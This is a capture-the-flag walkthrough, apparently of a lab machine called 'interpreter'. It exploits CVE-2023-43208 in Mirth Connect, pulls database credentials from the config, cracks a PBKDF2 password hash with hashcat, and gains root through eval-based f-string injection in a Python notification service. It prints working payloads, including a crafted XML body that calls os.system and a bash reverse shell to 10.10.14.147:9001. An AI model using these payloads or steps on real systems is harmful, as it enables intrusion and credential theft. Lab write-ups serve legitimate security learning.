# interpreter

## nmap

- 22: ssh
- 80: http "Mirth connect"
- 443: https
- 6661: unknown

---

### initial access

Mirth connect has an [unauthenticated rce](https://nvd.nist.gov/vuln/detail/cve-2023-43208) ([writeup](https://www.horizon3.ai/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/)) in versions < 4.4.1

mirth connect version running is 4.4.0. im lazy. there is a metasploit module. use wget if using http payload

read the config under `conf/mirth.properties` - using mariadb mc_bdd_prod with user mirthdb and basic password.

the database tables PERSON and PERSON_PASSWORD reveal a user `sedric`. let's try to crack the password

mirth docs say the password algo is PBKDF2WithHmacSHA256

stored in the database is a single base64 value of 40 bytes. the default iteration count (not overidden in mirth.properties) is 600000. default salt length is 8 bytes which matches what we have (digest should be 32 bytes). so presumably the salt and digest are concatenated, just need to see which end

i just sent both formats through hashcat, turns out the salt was stored at the first 8 bytes

- digest: `echo -n "<b64>" | base64 -d | tail -c32 | base64`
- salt: `echo -n "<b64>" | base64 -d | head -c8 | base64`

hashcat format: `sha256:600000:salt:digest`

password is reused for ssh. user key!!

probably time to find out what this :6661 process is, but first there is also a loopback http service at :54321. lets forward a port and see what's up

`ssh -L 54321:localhost:54321 -f -q -N sedric@10.129.244.184`

(remember box doesn't have curl)

just get some 404s. seems like some internal api.

---

### enumerating processes:

one process sticks out to me: `/usr/local/bin/notif.py` running as root, luckily sedric group has read perms. this is the server listening on :54321

code says it is a "notification server for added patients" and that it listens for XML messages w/ patient info and writes formatted notifs in `/var/secure-health/patients/`. it is intended to take data from mirthconnect that has been interpreted from HL7 to XML and formats it with a "safe" templating function.

in the `template()` function we see the final template gets passed to eval like `eval(f"f'''{template'''")`. the xml data expects a first, last name, DOB, sender_app, timestamp, gender.

the template being passed into eval looks like this:

`Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}`

there is a simple regex match for allowed chars at the start of `template()`, at least curly braces are allowed, so we can inject a format in to the f-strings, due to them being stacked

unfortunately, the regex blocks such chars as `<`, `>`, `;`, `,`, `$`, and other good ones, so directly injecting a reverse shell is essentially impossible. you might be able to do it by spanning the input across the different fields but that's some wizard shit

but this is enough, we can just write a script into `/home/sedric` with a reverse shell and execute it with `{os.system('/home/sedric/pwn.sh')}`

crafted xml payload (req.xml):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<patient>
    <firstname>{os.system('/home/sedric/pwn.sh')}</firstname>
    <lastname>xxx</lastname>
    <sender_app>xxx</sender_app>
    <timestamp>xxx</timestamp>
    <birth_date>01/01/1901</birth_date>
    <gender>xxx</gender>
</patient>
```

content of pwn.sh:

```bash
#!/bin/bash

sh -i >& /dev/tcp/10.10.14.147/9001 0>&1
```

POST command:

`curl -XPOST -d @req.xml -H "Content-Type: application/xml" http://localhost:54321/addPatient`

